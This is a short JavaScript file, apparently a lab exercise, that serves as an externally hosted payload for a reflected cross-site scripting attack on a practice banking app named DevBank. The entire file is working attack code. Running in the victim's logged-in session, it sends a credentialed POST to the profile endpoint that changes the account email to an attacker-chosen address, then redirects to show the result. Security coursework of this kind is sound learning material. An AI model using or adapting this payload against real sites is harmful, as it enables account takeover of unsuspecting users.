// B.2 external payload for reflected XSS
// This file is loaded from my GitHub/jsDelivr link.
// When it runs in DevBank, it changes the logged-in user's email.

var newEmail = "xss-owned@devbank.local";

// Show a message on the page so I can prove the external script executed.
document.body.prepend("External payload executed");

// Send the same kind of request as the profile form.
// The password is left blank, so only the email is changed.
var postData = "email=" + encodeURIComponent(newEmail) + "&password=";

fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  credentials: "include",
  body: postData
}).then(function () {
  // Open the profile page after the request so the changed email can be seen.
  window.location = "/profile";
});